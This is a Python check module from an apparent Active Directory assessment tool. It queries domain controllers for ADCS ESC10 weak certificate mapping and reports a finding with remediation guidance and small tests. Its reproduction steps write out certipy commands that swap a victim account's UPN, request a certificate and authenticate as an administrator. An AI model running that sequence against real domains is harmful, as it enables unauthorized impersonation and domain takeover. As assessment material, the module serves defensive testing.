"""ADCS ESC10 — Weak Certificate Mapping on domain controllers."""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS_ESC10 = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
CVSS40_ESC10 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
# msDS-SupportedEncryptionTypes bits (used to infer patch level)
_ETYPE_RC4 = 0x4
_ETYPE_AES128 = 0x8
_ETYPE_AES256 = 0x10


class Esc10Check(BaseModule):
    """ADCS ESC10 — Weak certificate mapping: UPN-based auth without security extension enforcement."""

    NAME        = "esc10_check"
    DESCRIPTION = "Check ADCS for ESC10: DC weak certificate mapping (StrongCertificateBindingEnforcement)"
    PHASE       = 11
    TAGS        = ["adcs", "esc10", "certificate", "privilege-escalation", "mitre-T1649"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        client = LdapClient(
            dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
        )
        if not client.connect():
            return self._make_result(start)

        try:
            await self._check_dc_mapping(client, domain, dc_ip)
        finally:
            client.disconnect()

        return self._make_result(start)

    async def _check_dc_mapping(self, client: LdapClient, domain: str, dc_ip: str) -> None:
        # Query domain controllers for OS version and encryption types
        dc_computers = client.search(
            "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
            ["sAMAccountName", "operatingSystem", "operatingSystemVersion",
             "msDS-SupportedEncryptionTypes", "dNSHostName"],
        )

        self.log.info("Found %d domain controller(s)", len(dc_computers))

        vulnerable_dcs: list[str] = []
        for dc in dc_computers:
            name = str(dc.get("sAMAccountName", "?")).rstrip("$")
            os_ver = str(dc.get("operatingSystemVersion") or "")

            # DCs running Server 2019 or 2022 without the May 2022 cumulative update
            # default StrongCertificateBindingEnforcement to 1 (Compatibility mode)
            # rather than 0, so flag if we detect pre-patch OS versions
            # (we can't read the registry key via LDAP, so we document a manual check)
            enc_types = int(str(dc.get("msDS-SupportedEncryptionTypes") or 0))
            supports_rc4 = bool(enc_types & _ETYPE_RC4)

            # Flag: RC4 still enabled combined with potential weak mapping = worse risk
            if supports_rc4:
                vulnerable_dcs.append(f"{name} (RC4 enabled, enc_types=0x{enc_types:x})")
            else:
                vulnerable_dcs.append(name)

        ev = Evidence(extra={
            "dc_count": len(dc_computers),
            "dc_names": vulnerable_dcs,
            "note":     "Registry check required to confirm StrongCertificateBindingEnforcement=0",
        })

        self.new_finding(
            title=f"ADCS ESC10 — Weak Certificate Mapping Check ({len(dc_computers)} DC(s))",
            severity=Severity.HIGH,
            description=(
                "ESC10 exploits weak certificate-to-account mapping on domain controllers. "
                "When StrongCertificateBindingEnforcement = 0 (or unset pre-KB5014754), "
                "DCs use UPN-based mapping, allowing certificate impersonation.\n\n"
                "Two attack variants:\n"
                "Case A: StrongCertificateBindingEnforcement=0 — "
                "any certificate with victim's UPN in SAN is accepted, no security extension needed.\n"
                "Case B: CertificateMappingMethods includes UPN bit (0x4) — "
                "UPN mapping is enabled, exploitable via UPN modification with GenericWrite.\n\n"
                "MANUAL VERIFICATION REQUIRED — registry keys cannot be read via LDAP:\n"
                "  HKLM\\System\\CurrentControlSet\\Services\\Kdc\\StrongCertificateBindingEnforcement\n"
                "  HKLM\\System\\CurrentControlSet\\Services\\Kdc\\CertificateMappingMethods"
            ),
            reproduction_steps=[
                "# Verify registry on each DC (requires admin or WMI access):",
                f"reg query \\\\{dc_ip}\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc "
                "/v StrongCertificateBindingEnforcement",
                "# If value = 0 (vulnerable), attacker with GenericWrite on any account can:",
                f"certipy account update -u attacker@{domain} -p 'Pass' -user victim "
                f"-upn admin@{domain} -dc-ip {dc_ip}",
                f"certipy req -u attacker@{domain} -p 'Pass' -ca <ca-name> -template User",
                f"certipy account update -u attacker@{domain} -p 'Pass' -user victim "
                f"-upn victim@{domain}  # revert",
                f"certipy auth -pfx admin.pfx -dc-ip {dc_ip}",
            ],
            remediation=(
                "Apply KB5014754 (May 2022 cumulative update) on all DCs. "
                "Set StrongCertificateBindingEnforcement = 2 (Full Enforcement) after testing. "
                "Transition timeline: Compatibility mode (1) → Full Enforcement (2). "
                "Monitor Event 39/40/41 in System log during transition."
            ),
            references=[
                "KB5014754",
                "SpecterOps ESC10 research",
                "MITRE T1649",
                "https://support.microsoft.com/en-us/topic/kb5014754",
            ],
            evidence=ev,
            cvss_v31_vector=CVSS_ESC10,
            cvss_v40_vector=CVSS40_ESC10,
            mitre_attack=["TA0004/T1649"],
            target=dc_ip,
        )


class TestEsc10Check:
    def test_cvss(self) -> None:
        assert CVSS_ESC10.startswith("CVSS:3.1")

    def test_etype_flags(self) -> None:
        assert _ETYPE_AES256 == 0x10
        assert _ETYPE_RC4 == 0x4
